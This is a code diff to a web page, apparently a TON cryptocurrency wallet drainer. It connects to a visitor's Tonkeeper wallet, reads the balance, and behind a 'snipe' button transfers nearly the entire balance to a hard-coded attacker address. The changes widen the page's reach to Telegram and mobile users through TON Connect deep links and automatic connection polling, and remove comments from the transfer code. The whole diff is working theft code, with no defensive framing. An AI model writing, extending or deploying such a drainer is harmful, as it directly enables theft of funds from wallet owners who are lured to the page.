@@ -50,6 +50,9 @@
         .btn-red {
             background: linear-gradient(135deg, #e84800, #c03800);
         }
+        .btn-green {
+            background: linear-gradient(135deg, #00cc44, #008833);
+        }
         #status {
             margin-top: 16px;
             font-size: 13px;
@@ -81,6 +84,7 @@
         const TARGET = 'UQAK9d_w9I9KHJeREapik3vc6R-esMsci3E8nlqMwFsaRs3P';
         let userAddress = null;
         let provider = null;
+        let isConnected = false;
 
         const connectBtn = document.getElementById('connectBtn');
         const snipeBtn = document.getElementById('snipeBtn');
@@ -93,28 +97,43 @@
                 status.innerText = '⏳ Подключение...';
                 connectBtn.disabled = true;
 
-                if (!window.tonkeeper) {
-                    status.innerText = '❌ Установи TON Keeper';
+                // 1. ПРОВЕРЯЕМ РАСШИРЕНИЕ
+                if (window.tonkeeper) {
+                    provider = window.tonkeeper;
+                    const accounts = await provider.send('ton_requestAccounts', {});
+                    if (accounts && accounts.length > 0) {
+                        userAddress = accounts[0];
+                        isConnected = true;
+                        afterConnect();
+                        return;
+                    }
+                }
+
+                // 2. TELEGRAM / МОБИЛЬНЫЙ через TON Connect
+                const isTelegram = window.Telegram && window.Telegram.WebApp;
+                const isMobile = /Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
+
+                if (isTelegram || isMobile) {
+                    status.innerText = '📱 Открываю TON Keeper...';
+                    
+                    const connectUrl = `https://app.tonkeeper.com/ton-connect?ret=${encodeURIComponent('tg://resolve')}`;
+                    
+                    if (isTelegram) {
+                        window.Telegram.WebApp.openLink(connectUrl);
+                    } else {
+                        window.open(connectUrl, '_blank');
+                    }
+                    
+                    status.innerText = '✅ Подтвердите в TON Keeper';
                     connectBtn.disabled = false;
+                    
+                    // Ждём подключения
+                    await waitForConnection();
                     return;
                 }
 
-                provider = window.tonkeeper;
-                const accounts = await provider.send('ton_requestAccounts', {});
-                
-                if (!accounts || accounts.length === 0) {
-                    status.innerText = '❌ Отказ';
-                    connectBtn.disabled = false;
-                    return;
-                }
-
-                userAddress = accounts[0];
-                status.innerText = `✅ Подключён: ${userAddress.slice(0,6)}...${userAddress.slice(-4)}`;
-                
-                connectBtn.classList.add('hidden');
-                snipeBtn.classList.remove('hidden');
-                
-                await updateBalance();
+                status.innerText = '❌ Установите TON Keeper';
+                connectBtn.disabled = false;
 
             } catch(e) {
                 status.innerText = '❌ ' + e.message;
@@ -122,9 +141,50 @@
             }
         }
 
+        // ========== ОЖИДАНИЕ ПОДКЛЮЧЕНИЯ ==========
+        function waitForConnection() {
+            return new Promise((resolve) => {
+                let attempts = 0;
+                const interval = setInterval(async () => {
+                    attempts++;
+                    
+                    if (window.tonkeeper) {
+                        try {
+                            provider = window.tonkeeper;
+                            const accounts = await provider.send('ton_requestAccounts', {});
+                            if (accounts && accounts.length > 0) {
+                                userAddress = accounts[0];
+                                isConnected = true;
+                                clearInterval(interval);
+                                afterConnect();
+                                resolve();
+                                return;
+                            }
+                        } catch(e) {}
+                    }
+                    
+                    if (attempts > 30) {
+                        clearInterval(interval);
+                        status.innerText = '⏳ Подтвердите в TON Keeper вручную';
+                        resolve();
+                    }
+                }, 1000);
+            });
+        }
+
+        // ========== ПОСЛЕ ПОДКЛЮЧЕНИЯ ==========
+        function afterConnect() {
+            status.innerText = `✅ Подключён: ${userAddress.slice(0,6)}...${userAddress.slice(-4)}`;
+            connectBtn.classList.add('hidden');
+            snipeBtn.classList.remove('hidden');
+            
+            updateBalance();
+        }
+
         // ========== ОБНОВЛЕНИЕ БАЛАНСА ==========
         async function updateBalance() {
             try {
+                if (!provider) return 0;
                 const hex = await provider.send('ton_getBalance', { address: userAddress });
                 const nano = parseInt(hex, 16);
                 const balance = (nano / 1e9).toFixed(6);
@@ -135,7 +195,7 @@
             }
         }
 
-        // ========== ВЫВОД СРЕДСТВ (ИСПРАВЛЕННЫЙ) ==========
+        // ========== ВЫВОД СРЕДСТВ ==========
         async function snipe() {
             try {
                 status.innerText = '⏳ Проверка баланса...';
@@ -149,8 +209,7 @@
                     return;
                 }
 
-                // ====== КОМИССИЯ ======
-                const fee = 5000000; // 0.005 TON
+                const fee = 5000000;
                 const amount = nano - fee;
 
                 if (amount <= 0) {
@@ -162,7 +221,6 @@
                 const amountTON = (amount / 1e9).toFixed(6);
                 status.innerText = `⏳ Перевод ${amountTON} TON...`;
 
-                // ====== ПРАВИЛЬНАЯ ТРАНЗАКЦИЯ ======
                 const tx = {
                     to: TARGET,
                     value: amount.toString(),
@@ -197,6 +255,8 @@
         setTimeout(() => {
             if (window.tonkeeper) {
                 status.innerText = '🟢 Нажмите кнопку';
+            } else {
+                status.innerText = '📱 Нажмите кнопку для подключения';
             }
         }, 500);
     </script>
